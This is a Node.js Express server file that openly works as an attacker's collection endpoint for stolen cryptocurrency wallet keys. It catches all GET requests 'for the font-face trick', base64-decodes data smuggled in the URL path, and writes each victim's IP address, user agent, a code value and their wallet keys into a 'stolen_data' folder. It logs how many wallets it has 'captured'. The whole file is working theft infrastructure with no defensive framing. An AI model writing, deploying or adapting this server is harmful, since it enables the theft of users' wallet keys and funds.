// server.js - CommonJS version (more reliable on Render.com)
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FOLDER = path.join(__dirname, 'stolen_data');

// Create data folder if it doesn't exist
if (!fs.existsSync(DATA_FOLDER)) {
    fs.mkdirSync(DATA_FOLDER, { recursive: true });
}

app.use(express.json());

// Catch all GET requests (for the font-face trick)
app.get('*', (req, res) => {
    const fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const receivedAt = new Date().toISOString();

    console.log(`[${receivedAt}] 📥 Request received: ${fullUrl}`);

    try {
        const segments = req.path.split('/').filter(s => s.length > 0);
        const encodedData = segments[segments.length - 1] || '';

        if (encodedData.length < 30) {
            console.log("⚠️ No valid data found");
            res.status(200).send('OK');
            return;
        }

        const decodedStr = Buffer.from(encodedData, 'base64').toString('utf8');
        const data = JSON.parse(decodedStr);

        const output = {
            receivedAt: receivedAt,
            ip: req.ip || req.socket.remoteAddress,
            userAgent: data.header || req.get('user-agent') || 'unknown',
            timestamp: data.timestamp,
            site: data.site || 'Axiom',
            code: data.code,
            keysCount: data.keys ? data.keys.length : 0,
            keys: data.keys || []
        };

        const filename = `stolen_${timestamp}.json`;
        const filepath = path.join(DATA_FOLDER, filename);

        fs.writeFileSync(filepath, JSON.stringify(output, null, 2));

        console.log(`✅ SAVED: ${filename} | ${output.keysCount} wallet(s) captured`);

    } catch (err) {
        console.error(`❌ Error: ${err.message}`);
        try {
            fs.writeFileSync(path.join(DATA_FOLDER, `error_${timestamp}.txt`), 
                `URL: ${fullUrl}\nError: ${err.message}`);
        } catch (e) {}
    }

    res.status(200).send('OK');
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'running', time: new Date().toISOString() });
});

app.listen(PORT, () => {
    console.log(`🚀 Server is running on port ${PORT}`);
    console.log(`📁 Data will be saved in /stolen_data folder`);
});